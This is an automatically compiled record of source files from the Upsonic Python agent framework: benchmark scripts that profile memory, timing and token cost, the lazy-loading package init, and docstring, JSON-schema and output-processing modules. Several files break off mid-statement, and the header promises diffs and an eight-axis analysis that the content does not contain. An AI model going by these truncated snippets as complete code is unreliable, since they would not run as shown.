# Forensic Learning Record (Deep Inspection): Upsonic/Upsonic

> **Canonical Artifact**: `07_PROJECT_LEARNING/upsonic-upsonic-learnings.md`  
> **Source Platform**: GitHub ([https://github.com/Upsonic/Upsonic](https://github.com/Upsonic/Upsonic))  
> **Harvest Method**: Full-Spectrum Deep Extraction (Patches, Diffs, Source Code, Post-Mortems)  
> **Harvest Timestamp**: 2026-09-30T18:50:53.910Z  
> **Compliance State**: Free Tier Guaranteed | Strict Rate-Limit Backoff Honored  

---

## 1. Context & Architectural Overview
- **Repository / Resource**: `Upsonic/Upsonic`
- **Description**: Build autonomous AI agents in Python.
- **Primary Language / Ecosystem**: Python
- **Discovered Manifests / Configurations**: pyproject.toml, README.md
- **Stars / Engagement**: 7956 stars

---

## 2. Multi-Dimensional 8-Axis Investigation & Real Code Patches

### D1: Architecture & Structural Boundaries
- Entry configurations inspected via direct stream: pyproject.toml, README.md.
- Evaluated system abstractions and modular contracts.

### Core Architecture Module: `benchmarks/__init__.py`
```
"""
Upsonic Framework Benchmarks

This package contains benchmark utilities and scripts to measure
the performance of different Upsonic components.

Available Benchmark Projects:
- overhead_analysis: Direct vs Agent performance comparison

Shared utilities are available in the utils module.
"""

__version__ = "0.1.0"

from .utils import (
    MemoryProfiler,
    PerformanceProfiler,
    BenchmarkResult,
    BenchmarkReporter,
    MemoryMetrics,
    PerformanceMetrics,
    CostMetrics
)

__all__ = [
    "MemoryProfiler",
    "PerformanceProfiler",
    "BenchmarkResult",
    "BenchmarkReporter",
    "MemoryMetrics",
    "PerformanceMetrics",
    "CostMetrics",
]


```

### Core Architecture Module: `benchmarks/overhead_analysis/__init__.py`
```
"""
Overhead Analysis Benchmark

Compares the performance overhead between Direct LLM Call (minimal overhead)
and Agent (full-featured) approaches in the Upsonic framework.

This benchmark measures:
- Memory footprint (object sizes, peak memory usage)
- Execution speed (initialization time, task completion time)
- Performance ratios and comparisons
"""

__version__ = "0.1.0"

from .test_cases import TestCases

__all__ = ["TestCases"]


```

### Core Architecture Module: `benchmarks/overhead_analysis/benchmark.py`
```
#!/usr/bin/env python3
"""
Overhead Analysis: Direct vs Agent Benchmark

This benchmark compares the performance overhead of Upsonic's Direct LLM Call
(minimal overhead) versus the full-featured Agent approach.

Usage:
    python -m benchmarks.overhead_analysis.benchmark
    python -m benchmarks.overhead_analysis.benchmark --test-case "Simple Text Query"
    python -m benchmarks.overhead_analysis.benchmark --model "gpt-5-mini-2025-08-07"
    python -m benchmarks.overhead_analysis.benchmark --model "gpt-5-mini-2025-08-07,anthropic/claude-3-5-haiku-20241022"
    python -m benchmarks.overhead_analysis.benchmark --iterations 20 --all-tests
"""

import argparse
import asyncio
import sys
import time
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

from dotenv import load_dotenv
import os
# Disable telemetry
os.environ["UPSONIC_TELEMETRY"] = "False"

# Add parent directory to path
sys.path.insert(0, str(Path(__file__).parent.parent.parent))

from upsonic import Agent, Direct, Task
from benchmarks.overhead_analysis.test_cases import TestCases
from benchmarks.utils import (
    BenchmarkReporter,
    BenchmarkResult,
    CostMetrics,
    MemoryMetrics,
    MemoryProfiler,
    PerformanceMetrics,
    PerformanceProfiler,
)


def _create_task_from_test_case(test_case: Dict[str, Any]) -> Task:
    """Create a Task object from a test case dictionary."""
    return Task(
        description=test_case["description"],
        response_format=test_case.get("response_format", str),
        attachments=test_case.get("attachments"),
        context=test_case.get("context"),
    )


def _extract_task_metadata(test_case: Dict[str, Any]) -> Dict[str, Any]:
    """Extract task metadata for reporting."""
    response_format = test_case.get("response_format", str)
    format_name = (
        response_format.__name__
        if hasattr(response_format, "__name__")
        else str(response_format)
    )

    return {
        "description": test_case["description"],
        "response_format": format_name,
        "attachments": test_case.get("attachments"),
        "context": test_case.get("context"),
    }


def validate_model(model_str: str) -> Tuple[bool, str]:
    """
    Validate a model by making a minimal test call.

    Args:
        model_str: Model identifier (e.g., "gpt-5-mini-2025-08-07")

    Returns:
        Tuple of (is_valid, error_message)
    """
    try:
        direct = Direct(model=model_str)
        task = Task(description="test", response_format=str)

        # Make minimal test call
        try:
            direct.do(task)
            return True, ""
        except Exception as e:
            error_msg = str(e)
            # Parse common error types
            if "404" in error_msg or "not_found" in error_msg.lower():
                return False, f"Model not found: {model_str.split('/')[-1]}"
            elif "401" in error_msg or "authentication" in error_msg.lower():
                return False, "Authentication failed. Check your API key."
            elif "400" in error_msg:
                return False, f"Bad request: {error_msg[:100]}"
            else:
                return False, error_msg[:150]

    except Exception as e:
        error_msg = str(e)
        if "Unknown provider" in error_msg:
            return False, f"Unknown provider: {model_str.split('/')[0]}"
        return False, error_msg[:150]


def benchmark_direct(
    test_case: Dict[str, Any], model: str = "gpt-5-mini-2025-08-07", iterations: int = 5
) -> BenchmarkResult:
    """
    Benchmark Direct LLM Call approach.

    Args:
        test_case: Test case dictionary from TestCases
        model: Model identifier
        iterations: Number of iterations for performance measurement

    Returns:
        BenchmarkResult with metrics
    """
    print(f"\n🔍 Benchmarking Direct LLM Call...")

    memory_profiler = MemoryProfiler()

    # Measure initialization time and memory
    memory_profiler.start_tracking()
    init_start = time.perf_counter()

    direct = Direct(model=model)

    init_end = time.perf_counter()
    init_current_mb, init_peak_mb = memory_profiler.stop_tracking()
    init_time_ms = (init_end - init_start) * 1000

    # Measure object size
    shallow_size, deep_size = memory_profiler.measure_object_size(direct)

    print(f"  ✓ Initialization: {init_time_ms:.2f} ms")
    print(f"  ✓ Object size: {deep_size:,} bytes")

    # Track cost metrics
    total_cost = 0.0
    total_input_tokens = 0
    total_output_tokens = 0
    sample_output = None

    # Execution function
    def execute_task() -> Any:
        nonlocal total_cost, total_input_tokens, total_output_tokens

        task = _create_task_from_test_case(test_case)
        result = direct.do(task, show_output=False)

        # Collect cost metrics from task
        if task.total_cost:
            total_cost += task.total_cost
        if task.total_input_token:
            total_input_tokens += task.total_input_token
        if task.total_output_token:
            total_output_tokens += task.total_output_token

        return result

    # Warmup run and capture sample output
    print(f"  ⏳ Running warmup...")
    try:
        sample_output = str(execute_task())
    except Exception as e:
        print(f"\n  ❌ Warmup failed: {str(e)[:200]}")
        print(f"  ⚠️  Skipping this benchmark due to model error\n")
        raise

    # Measure multiple runs for statistics
    print(f"  ⏳ Running {iterations} iterations...")
    memory_profiler.start_tracking()

    perf_metrics = PerformanceProfiler.measure_multiple_runs(
        execute_task, iterations=iterations, warmup=0  # Already did warmup
    )

    exec_current_mb, exec_peak_mb = memory_profiler.stop_tracking()

    # Update performance metrics with init time
    perf_metrics.init_time_ms = init_time_ms
    perf_metrics.total_time_ms = init_time_ms + perf_metrics.execution_time_ms

    # Create memory metrics
    memory_metrics = MemoryMetrics(
        shallow_size_bytes=shallow_size,
        deep_size_bytes=deep_size,
        peak_memory_mb=max(init_peak_mb, exec_peak_mb),
        current_memory_mb=exec_current_mb,
    )

    print(f"  ✓ Average execution: {perf_metrics.mean_time_ms:.2f} ms")
    print(f"  ✓ Peak memory: {memory_metrics.peak_memory_mb:.2f} MB")

    # Create cost metrics
    total_tokens = total_input_tokens + total_output_tokens
    cost_per_1k = (total_cost / (total_tokens / 1000)) if total_tokens > 0 else 0.0

    cost_metrics = CostMetrics(
        total_cost=total_cost,
        input_tokens=total_input_tokens,
        output_tokens=total_output_tokens,
        total_tokens=total_tokens,
        cost_per_1k_tokens=cost_per_1k,
    )

    print(f"  ✓ Total cost: ${total_cost:.6f}")
    print(f"  ✓ Total tokens: {total_tokens:,}")

    return BenchmarkResult(
        name="Direct",
        memory=memory_metrics,
        performance=perf_metrics,
        cost=cost_metrics,
        metadata={
            "model": model,
            "test_case": test_case["name"],
            "task_details": _extract_task_metadata(test_case),
        },
        sample_output=sample_output,
    )


def benchmark_agent(
    test_case: Dict[str, Any], 
    model: str = "gpt-5-mini-2025-08-07", 
    iterations: int = 5,
    with_system_prompt: bool = False
) -> BenchmarkResult:
    """
    Benchmark Agent approach.

    Args:
        test_case: Test case dictionary from TestCases
        model: Model identifier
        iterations: Number of iterations for performance measurement
        with_system_prompt: Whether to use default system prompt (default: False)

    Returns:
        BenchmarkResult with metrics
    """
    prompt_type = "with system prompt" if with_system_prompt else "without system prompt"
    print(f"\n🤖 Benchmarking Agent ({prompt_type})...")

    memory_profiler = MemoryProfiler()

    # Measure initialization time and memory
    memory_profiler.start_tracking()
    init_start = time.perf_counter()

    if wi
```

### Core Architecture Module: `benchmarks/utils.py`
```
"""
Benchmark utilities for memory and performance profiling.
"""

import sys
import time
import tracemalloc
import statistics
import platform
import json
from dataclasses import dataclass, asdict
from typing import Any, Dict, List, Optional, Callable
from datetime import datetime
from pathlib import Path


@dataclass
class MemoryMetrics:
    """Memory usage metrics."""
    shallow_size_bytes: int
    deep_size_bytes: int
    peak_memory_mb: float
    current_memory_mb: float
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class CostMetrics:
    """Cost and token usage metrics."""
    total_cost: float
    input_tokens: int
    output_tokens: int
    total_tokens: int
    cost_per_1k_tokens: float
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class PerformanceMetrics:
    """Performance timing metrics."""
    init_time_ms: float
    execution_time_ms: float
    total_time_ms: float
    iterations: int
    mean_time_ms: Optional[float] = None
    median_time_ms: Optional[float] = None
    stdev_time_ms: Optional[float] = None
    min_time_ms: Optional[float] = None
    max_time_ms: Optional[float] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return asdict(self)


@dataclass
class BenchmarkResult:
    """Complete benchmark result for a single approach."""
    name: str
    memory: MemoryMetrics
    performance: PerformanceMetrics
    cost: CostMetrics
    metadata: Dict[str, Any]
    sample_output: Optional[str] = None
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "name": self.name,
            "memory": self.memory.to_dict(),
            "performance": self.performance.to_dict(),
            "cost": self.cost.to_dict(),
            "metadata": self.metadata,
            "sample_output": self.sample_output
        }


class MemoryProfiler:
    """Profile memory usage of objects and operations."""
    
    def __init__(self):
        self.current_memory = 0.0
        self.peak_memory = 0.0
    
    def start_tracking(self) -> None:
        """Start tracking memory allocations."""
        tracemalloc.start()
    
    def stop_tracking(self) -> tuple[float, float]:
        """Stop tracking and return (current_mb, peak_mb)."""
        current, peak = tracemalloc.get_traced_memory()
        tracemalloc.stop()
        
        current_mb = current / (1024 * 1024)
        peak_mb = peak / (1024 * 1024)
        
        self.current_memory = current_mb
        self.peak_memory = peak_mb
        
        return current_mb, peak_mb
    
    @staticmethod
    def measure_object_size(obj: Any) -> tuple[int, int]:
        """
        Measure object size in bytes.
        
        Returns:
            tuple: (shallow_size, deep_size)
        """
        shallow_size = sys.getsizeof(obj)
        
        # Try to get deep size using pympler if available
        try:
            from pympler import asizeof
            deep_size = asizeof.asizeof(obj)
        except ImportError:
            # Fallback: use shallow size
            deep_size = shallow_size
        
        return shallow_size, deep_size
    
    def profile_operation(self, operation: Callable, *args, **kwargs) -> MemoryMetrics:
        """
        Profile memory usage of an operation.
        
        Args:
            operation: Callable to execute
            *args: Arguments for the callable
            **kwargs: Keyword arguments for the callable
            
        Returns:
            MemoryMetrics with memory usage information
        """
        self.start_tracking()
        
        result = operation(*args, **kwargs)
        
        current_mb, peak_mb = self.stop_tracking()
        
        shallow_size, deep_size = self.measure_object_size(result)
        
        return MemoryMetrics(
            shallow_size_bytes=shallow_size,
            deep_size_bytes=deep_size,
            peak_memory_mb=peak_mb,
            current_memory_mb=current_mb
        )


class PerformanceProfiler:
    """Profile execution time and performance metrics."""
    
    @staticmethod
    def measure_time(operation: Callable, *args, **kwargs) -> tuple[Any, float]:
        """
        Measure execution time of an operation.
        
        Returns:
            tuple: (result, elapsed_time_ms)
        """
        start = time.perf_counter()
        result = operation(*args, **kwargs)
        end = time.perf_counter()
        
        elapsed_ms = (end - start) * 1000
        return result, elapsed_ms
    
    @staticmethod
    def measure_multiple_runs(
        operation: Callable,
        iterations: int = 10,
        warmup: int = 1,
        *args,
        **kwargs
    ) -> PerformanceMetrics:
        """
        Measure performance across multiple runs with statistics.
        
        Args:
            operation: Callable to execute
            iterations: Number of iterations to run
            warmup: Number of warmup runs (not counted)
            *args: Arguments for the callable
            **kwargs: Keyword arguments for the callable
            
        Returns:
            PerformanceMetrics with detailed timing statistics
        """
        # Warmup runs
        for _ in range(warmup):
            operation(*args, **kwargs)
        
        # Actual measurement runs
        times = []
        for _ in range(iterations):
            _, elapsed = PerformanceProfiler.measure_time(operation, *args, **kwargs)
            times.append(elapsed)
        
        # Calculate statistics
        mean_time = statistics.mean(times)
        median_time = statistics.median(times)
        stdev_time = statistics.stdev(times) if len(times) > 1 else 0.0
        min_time = min(times)
        max_time = max(times)
        
        return PerformanceMetrics(
            init_time_ms=0.0,  # To be set separately if needed
            execution_time_ms=mean_time,
            total_time_ms=mean_time,
            iterations=iterations,
            mean_time_ms=mean_time,
            median_time_ms=median_time,
            stdev_time_ms=stdev_time,
            min_time_ms=min_time,
            max_time_ms=max_time
        )


class BenchmarkReporter:
    """Generate and save benchmark reports."""
    
    @staticmethod
    def get_system_info() -> Dict[str, Any]:
        """Get system information for the report."""
        return {
            "platform": platform.platform(),
            "python_version": platform.python_version(),
            "processor": platform.processor(),
            "machine": platform.machine(),
        }
    
    @staticmethod
    def create_comparison_report(
        results: List[BenchmarkResult],
        test_name: str,
        upsonic_version: str = "0.1.0"
    ) -> Dict[str, Any]:
        """
        Create a comprehensive comparison report.
        
        Args:
            results: List of BenchmarkResult objects
            test_name: Name of the test scenario
            upsonic_version: Version of Upsonic framework
            
        Returns:
            Dictionary with complete report
        """
        report = {
            "timestamp": datetime.now().isoformat(),
            "test_name": test_name,
            "upsonic_version": upsonic_version,
            "system_info": BenchmarkReporter.get_system_info(),
            "results": {result.name: result.to_dict() for result in results}
        }
        
        # Add comparison based on number of results
        direct_result = next((r for r in results if r.name == "Direct"), None)
        agent_no_prompt = next((r for r in results if "no prompt" in r.name), None)
        agent_with_prompt = next((r for r in results if "with prompt" in r.name), None)
        
        # Handle 3-way comparison (Direct, Agent no prompt, Agent with prompt)
        if len(results) == 3 and direct_result and agent_no_prompt and agent_with_prompt:
            comparisons = {}
            
            # Direct vs Agent (no prompt)
 
```

### Core Architecture Module: `src/upsonic/__init__.py`
```
import importlib
import os
import warnings
from pathlib import Path
from typing import Any

__version__ = "0.77.3" # x-release-please-version

from dotenv import load_dotenv

from upsonic.utils.logging_config import *

warnings.filterwarnings("ignore", category=ResourceWarning)
warnings.filterwarnings("ignore", category=PendingDeprecationWarning)
warnings.filterwarnings("ignore", category=DeprecationWarning)

_lazy_imports = {}

# Load .env file from current working directory (where user runs their script)
# This ensures .env is found even when package is installed in site-packages
cwd = Path(os.getcwd())
env_path = cwd / ".env"
if env_path.exists():
    load_dotenv(env_path, override=False)
else:
    # Fallback: search from current directory upwards (default behavior)
    load_dotenv(override=False)

def _lazy_import(module_name: str, class_name: str | None = None):
    """Lazy import function to defer heavy imports until actually needed."""
    def _import():
        if module_name not in _lazy_imports:
            _lazy_imports[module_name] = importlib.import_module(module_name)
        
        if class_name:
            return getattr(_lazy_imports[module_name], class_name)
        return _lazy_imports[module_name]
    
    return _import

def _get_Task():
    task_cls = _lazy_import("upsonic.tasks.tasks", "Task")()
    # Ensure all dependencies are imported before rebuilding
    try:
        # Import dependencies to resolve forward references
        _lazy_import("upsonic.embeddings.factory", "EmbeddingProvider")()
        _lazy_import("upsonic.agent.agent", "Agent")()
        _lazy_import("upsonic.cache.cache_manager", "CacheManager")()
        _lazy_import("upsonic.tools.base", "Tool")()
        # Now rebuild the model
        task_cls.model_rebuild()
    except Exception:
        pass
    return task_cls

def _get_KnowledgeBase():
    return _lazy_import("upsonic.knowledge_base.knowledge_base", "KnowledgeBase")()

def _get_Agent():
    agent_cls = _lazy_import("upsonic.agent.agent", "Agent")()
    # After Agent is imported, rebuild Task model to resolve forward references
    try:
        from upsonic.tasks.tasks import Task
        Task.model_rebuild()
    except Exception:
        pass
    return agent_cls

def _get_Clanker():
    clanker_cls = _lazy_import("upsonic.agent.agent", "Clanker")()
    try:
        from upsonic.tasks.tasks import Task
        Task.model_rebuild()
    except Exception:
        pass
    return clanker_cls

def _get_Graph():
    return _lazy_import("upsonic.graph.graph", "Graph")()

def _get_Team():
    return _lazy_import("upsonic.team.team", "Team")()

def _get_Chat():
    return _lazy_import("upsonic.chat.chat", "Chat")()

def _get_Direct():
    return _lazy_import("upsonic.direct", "Direct")()

def _get_Simulation():
    return _lazy_import("upsonic.simulation.simulation", "Simulation")()

def _get_RalphLoop():
    return _lazy_import("upsonic.ralph.loop", "RalphLoop")()

def _get_AutonomousAgent():
    return _lazy_import("upsonic.agent.autonomous_agent.autonomous_agent", "AutonomousAgent")()

def _get_PrebuiltAutonomousAgentBase():
    return _lazy_import("upsonic.prebuilt.prebuilt_agent_base", "PrebuiltAutonomousAgentBase")()

def hello() -> str:
    return "Hello from upsonic!"

def __getattr__(name: str) -> Any:
    """Lazy loading of heavy modules and classes.
    
    Only Agent, Task, KnowledgeBase, Graph, Team, Chat, Direct, cancel_run are directly available.
    All other classes must be imported from their sub-modules.
    """
    
    # Only these classes are directly available
    if name == "Task":
        return _get_Task()
    elif name == "KnowledgeBase":
        return _get_KnowledgeBase()
    elif name == "Agent":
        return _get_Agent()
    elif name == "Clanker":
        return _get_Clanker()
    elif name == "Graph":
        return _get_Graph()
    elif name == "Team":
        return _get_Team()
    elif name == "Chat":
        return _get_Chat()
    elif name == "Direct":
        return _get_Direct()
    elif name == "Simulation":
        return _get_Simulation()
    elif name == "RalphLoop":
        return _get_RalphLoop()
    elif name == "AutonomousAgent":
        return _get_AutonomousAgent()
    elif name == "PrebuiltAutonomousAgentBase":
        return _get_PrebuiltAutonomousAgentBase()
    
    # All other imports must come from sub-modules
    raise AttributeError(
        f"module '{__name__}' has no attribute '{name}'. "
        f"Please import from the appropriate sub-module. "
        f"For example: from upsonic.agent.agent import Agent"
    )

__all__ = [
    "hello",
    "Task",
    "KnowledgeBase",
    "Clanker",
    "Agent",
    "AutonomousAgent",
    "PrebuiltAutonomousAgentBase",
    "Graph",
    "Team",
    "Chat",
    "Direct",
    "Simulation",
    "RalphLoop",
]

```

### Core Architecture Module: `src/upsonic/_griffe.py`
```
from __future__ import annotations as _annotations

import logging
import re
from collections.abc import Callable
from contextlib import contextmanager
from inspect import Signature
from typing import TYPE_CHECKING, Any, Literal, cast

from griffe import Docstring, DocstringSectionKind, GoogleOptions, Object as GriffeObject

if TYPE_CHECKING:
    from .tools import DocstringFormat

DocstringStyle = Literal['google', 'numpy', 'sphinx']


def doc_descriptions(
    func: Callable[..., Any],
    sig: Signature,
    *,
    docstring_format: DocstringFormat,
) -> tuple[str | None, dict[str, str]]:
    """Extract the function description and parameter descriptions from a function's docstring.

    The function parses the docstring using the specified format (or infers it if 'auto')
    and extracts both the main description and parameter descriptions. If a returns section
    is present in the docstring, the main description will be formatted as XML.

    Returns:
        A tuple containing:
        - str: Main description string, which may be either:
            * Plain text if no returns section is present
            * XML-formatted if returns section exists, including <summary> and <returns> tags
        - dict[str, str]: Dictionary mapping parameter names to their descriptions
    """
    doc = func.__doc__
    if doc is None:
        return None, {}

    # see https://github.com/mkdocstrings/griffe/issues/293
    parent = cast(GriffeObject, sig)

    docstring_style = _infer_docstring_style(doc) if docstring_format == 'auto' else docstring_format
    # These options are only valid for Google-style docstrings
    # https://mkdocstrings.github.io/griffe/reference/docstrings/#google-options
    parser_options = (
        GoogleOptions(returns_named_value=False, returns_multiple_items=False) if docstring_style == 'google' else None
    )
    docstring = Docstring(
        doc,
        lineno=1,
        parser=docstring_style,
        parent=parent,
        parser_options=parser_options,
    )
    with _disable_griffe_logging():
        sections = docstring.parse()

    params = {}
    if parameters := next((p for p in sections if p.kind == DocstringSectionKind.parameters), None):
        params = {p.name: p.description for p in parameters.value}

    main_desc = ''
    if main := next((p for p in sections if p.kind == DocstringSectionKind.text), None):
        main_desc = main.value

    if return_ := next((p for p in sections if p.kind == DocstringSectionKind.returns), None):
        return_statement = return_.value[0]
        return_desc = return_statement.description
        return_type = return_statement.annotation
        type_tag = f'<type>{return_type}</type>\n' if return_type else ''
        return_xml = f'<returns>\n{type_tag}<description>{return_desc}</description>\n</returns>'

        if main_desc:
            main_desc = f'<summary>{main_desc}</summary>\n{return_xml}'
        else:
            main_desc = return_xml

    return main_desc, params


def _infer_docstring_style(doc: str) -> DocstringStyle:
    """Simplistic docstring style inference."""
    for pattern, replacements, style in _docstring_style_patterns:
        matches = (
            re.search(pattern.format(replacement), doc, re.IGNORECASE | re.MULTILINE) for replacement in replacements
        )
        if any(matches):
            return style
    # fallback to google style
    return 'google'


# See https://github.com/mkdocstrings/griffe/issues/329#issuecomment-2425017804
_docstring_style_patterns: list[tuple[str, list[str], DocstringStyle]] = [
    (
        r'\n[ \t]*:{0}([ \t]+\w+)*:([ \t]+.+)?\n',
        [
            'param',
            'parameter',
            'arg',
            'argument',
            'key',
            'keyword',
            'type',
            'var',
            'ivar',
            'cvar',
            'vartype',
            'returns',
            'return',
            'rtype',
            'raises',
            'raise',
            'except',
            'exception',
        ],
        'sphinx',
    ),
    (
        r'\n[ \t]*{0}:([ \t]+.+)?\n[ \t]+.+',
        [
            'args',
            'arguments',
            'params',
            'parameters',
            'keyword args',
            'keyword arguments',
            'other args',
            'other arguments',
            'other params',
            'other parameters',
            'raises',
            'exceptions',
            'returns',
            'yields',
            'receives',
            'examples',
            'attributes',
            'functions',
            'methods',
            'classes',
            'modules',
            'warns',
            'warnings',
        ],
        'google',
    ),
    (
        r'\n[ \t]*{0}\n[ \t]*---+\n',
        [
            'deprecated',
            'parameters',
            'other parameters',
            'returns',
            'yields',
            'receives',
            'raises',
            'warns',
            'attributes',
            'functions',
            'methods',
            'classes',
            'modules',
        ],
        'numpy',
    ),
]


@contextmanager
def _disable_griffe_logging():
    # Hacky, but suggested here: https://github.com/mkdocstrings/griffe/issues/293#issuecomment-2167668117
    old_level = logging.root.getEffectiveLevel()
    logging.root.setLevel(logging.ERROR)
    yield
    logging.root.setLevel(old_level)
```

### Core Architecture Module: `src/upsonic/_json_schema.py`
```
from __future__ import annotations as _annotations

import re
from abc import ABC, abstractmethod
from copy import deepcopy
from dataclasses import dataclass
from typing import Any, Literal

from upsonic.utils.package.exception import UserError

JsonSchema = dict[str, Any]


@dataclass(init=False)
class JsonSchemaTransformer(ABC):
    """Walks a JSON schema, applying transformations to it at each level.

    The transformer is called during a model's prepare_request() step to build the JSON schema
    before it is sent to the model provider.

    Note: We may eventually want to rework tools to build the JSON schema from the type directly, using a subclass of
    pydantic.json_schema.GenerateJsonSchema, rather than making use of this machinery.
    """

    def __init__(
        self,
        schema: JsonSchema,
        *,
        strict: bool | None = None,
        prefer_inlined_defs: bool = False,
        simplify_nullable_unions: bool = False, 
    ):
        self.schema = schema

        self.strict = strict
        """The `strict` parameter forces the conversion of the original JSON schema (`self.schema`) of a `ToolDefinition` or `OutputObjectDefinition` to a format supported by the model provider.

        The "strict mode" offered by model providers ensures that the model's output adheres closely to the defined schema. However, not all model providers offer it, and their support for various schema features may differ. For example, a model provider's required schema may not support certain validation constraints like `minLength` or `pattern`.
        """
        self.is_strict_compatible = True
        """Whether the schema is compatible with strict mode.

        This value is used to set `ToolDefinition.strict` or `OutputObjectDefinition.strict` when their values are `None`.
        """
        self.prefer_inlined_defs = prefer_inlined_defs
        self.simplify_nullable_unions = simplify_nullable_unions

        self.defs: dict[str, JsonSchema] = deepcopy(self.schema.get('$defs', {}))
        self.refs_stack: list[str] = []
        self.recursive_refs = set[str]()

    @abstractmethod
    def transform(self, schema: JsonSchema) -> JsonSchema:
        """Make changes to the schema."""
        return schema

    def walk(self) -> JsonSchema:
        schema = deepcopy(self.schema)

        # First, handle everything but $defs:
        schema.pop('$defs', None)
        handled = self._handle(schema)

        if not self.prefer_inlined_defs and self.defs:
            handled['$defs'] = {k: self._handle(v) for k, v in self.defs.items()}

        elif self.recursive_refs:
            # If we are preferring inlined defs and there are recursive refs, we _have_ to use a $defs+$ref structure
            # We try to use whatever the original root key was, but if it is already in use,
            # we modify it to avoid collisions.
            defs = {key: self.defs[key] for key in self.recursive_refs}
            root_ref = self.schema.get('$ref')
            root_key = None if root_ref is None else re.sub(r'^#/\$defs/', '', root_ref)
            if root_key is None:  # pragma: no cover
                root_key = self.schema.get('title', 'root')
                while root_key in defs:
                    # Modify the root key until it is not already in use
                    root_key = f'{root_key}_root'

            defs[root_key] = handled
            return {'$defs': defs, '$ref': f'#/$defs/{root_key}'}

        return handled

    def _handle(self, schema: JsonSchema) -> JsonSchema:
        nested_refs = 0
        if self.prefer_inlined_defs:
            while ref := schema.get('$ref'):
                key = re.sub(r'^#/\$defs/', '', ref)
                if key in self.recursive_refs:
                    break
                if key in self.refs_stack:
                    self.recursive_refs.add(key)
                    break  # recursive ref can't be unpacked
                self.refs_stack.append(key)
                nested_refs += 1

                def_schema = self.defs.get(key)
                if def_schema is None:  # pragma: no cover
                    raise UserError(f'Could not find $ref definition for {key}')
                schema = def_schema

        # Handle the schema based on its type / structure
        type_ = schema.get('type')
        if type_ == 'object':
            schema = self._handle_object(schema)
        elif type_ == 'array':
            schema = self._handle_array(schema)
        elif type_ is None:
            schema = self._handle_union(schema, 'anyOf')
            schema = self._handle_union(schema, 'oneOf')

        # Apply the base transform
        schema = self.transform(schema)

        if nested_refs > 0:
            self.refs_stack = self.refs_stack[:-nested_refs]

        return schema

    def _handle_object(self, schema: JsonSchema) -> JsonSchema:
        if properties := schema.get('properties'):
            handled_properties = {}
            for key, value in properties.items():
                handled_properties[key] = self._handle(value)
            schema['properties'] = handled_properties

        if (additional_properties := schema.get('additionalProperties')) is not None:
            if isinstance(additional_properties, bool):
                schema['additionalProperties'] = additional_properties
            else:
                schema['additionalProperties'] = self._handle(additional_properties)

        if (pattern_properties := schema.get('patternProperties')) is not None:
            handled_pattern_properties = {}
            for key, value in pattern_properties.items():
                handled_pattern_properties[key] = self._handle(value)
            schema['patternProperties'] = handled_pattern_properties

        return schema

    def _handle_array(self, schema: JsonSchema) -> JsonSchema:
        if prefix_items := schema.get('prefixItems'):
            schema['prefixItems'] = [self._handle(item) for item in prefix_items]

        if items := schema.get('items'):
            schema['items'] = self._handle(items)

        return schema

    def _handle_union(self, schema: JsonSchema, union_kind: Literal['anyOf', 'oneOf']) -> JsonSchema:
        try:
            members = schema.pop(union_kind)
        except KeyError:
            return schema

        handled = [self._handle(member) for member in members]

        if self.simplify_nullable_unions:
            handled = self._simplify_nullable_union(handled)
        if len(handled) == 1:
            # In this case, no need to retain the union
            return handled[0] | schema

        # If we have keys besides the union kind (such as title or discriminator), keep them without modifications
        schema = schema.copy()
        schema[union_kind] = handled
        return schema

    @staticmethod
    def _simplify_nullable_union(cases: list[JsonSchema]) -> list[JsonSchema]:
        if len(cases) == 2 and {'type': 'null'} in cases:
            # Find the non-null schema
            non_null_schema = next(
                (item for item in cases if item != {'type': 'null'}),
                None,
            )
            if non_null_schema:
                # Create a new schema based on the non-null part, mark as nullable
                new_schema = deepcopy(non_null_schema)
                new_schema['nullable'] = True
                return [new_schema]
            else:  # pragma: no cover
                # they are both null, so just return one of them
                return [cases[0]]

        return cases


class InlineDefsJsonSchemaTransformer(JsonSchemaTransformer):
    """Transforms the JSON Schema to inline $defs."""

    def __init__(self, schema: JsonSchema, *, strict: bool | None = None):
        super().__init__(schema, strict=strict, prefer_inlined_defs=True)

    def transform(self, schema: JsonSchema) -> JsonSchema:
        return schema
```

### Core Architecture Module: `src/upsonic/_output.py`
```
from __future__ import annotations as _annotations

import json
from abc import ABC, abstractmethod
from dataclasses import dataclass
from typing import TYPE_CHECKING, Generic

from upsonic import _utils
from upsonic.output import (
    OutputDataT,
    OutputMode,
    OutputObjectDefinition,
)


@dataclass(kw_only=True)
class OutputSchema(ABC, Generic[OutputDataT]):
    """Base class for output schemas."""
    text_processor: BaseOutputProcessor[OutputDataT] | None = None
    toolset: None = None
    object_def: OutputObjectDefinition | None = None
    allows_deferred_tools: bool = False
    allows_image: bool = False

    @property
    def mode(self) -> OutputMode:
        raise NotImplementedError()

    @property
    def allows_text(self) -> bool:
        return self.text_processor is not None


@dataclass(init=False)
class StructuredTextOutputSchema(OutputSchema[OutputDataT], ABC):
    processor: BaseObjectOutputProcessor[OutputDataT]
    template: str | None

    def __init__(
        self,
        *,
        template: str | None = None,
        processor: BaseObjectOutputProcessor[OutputDataT],
        allows_deferred_tools: bool,
        allows_image: bool,
    ):
        super().__init__(
            text_processor=processor,
            object_def=processor.object_def,
            allows_deferred_tools=allows_deferred_tools,
            allows_image=allows_image,
        )
        self.processor = processor
        self.template = template

    @classmethod
    def build_instructions(cls, template: str, object_def: OutputObjectDefinition) -> str:
        """Build instructions from a template and an object definition."""
        schema = object_def.json_schema.copy()
        if object_def.name:
            schema['title'] = object_def.name
        if object_def.description:
            schema['description'] = object_def.description

        if '{schema}' not in template:
            template = '\n\n'.join([template, '{schema}'])

        return template.format(schema=json.dumps(schema))


class BaseOutputProcessor(ABC, Generic[OutputDataT]):
    """Base class for output processors."""
    @abstractmethod
    async def process(
        self,
        data: str,
        allow_partial: bool = False,
        wrap_validation_errors: bool = True,
    ) -> OutputDataT:
        """Process an output message, performing validation and (if necessary) calling the output function."""
        raise NotImplementedError()


@dataclass(kw_only=True)
class BaseObjectOutputProcessor(BaseOutputProcessor[OutputDataT]):
    """Base class for object output processors."""
    object_def: OutputObjectDefinition


@dataclass(init=False)
class PromptedOutputProcessor(BaseObjectOutputProcessor[OutputDataT]):
    """Processor for prompted output that strips markdown fences."""
    wrapped: BaseObjectOutputProcessor[OutputDataT]

    def __init__(self, wrapped: BaseObjectOutputProcessor[OutputDataT]):
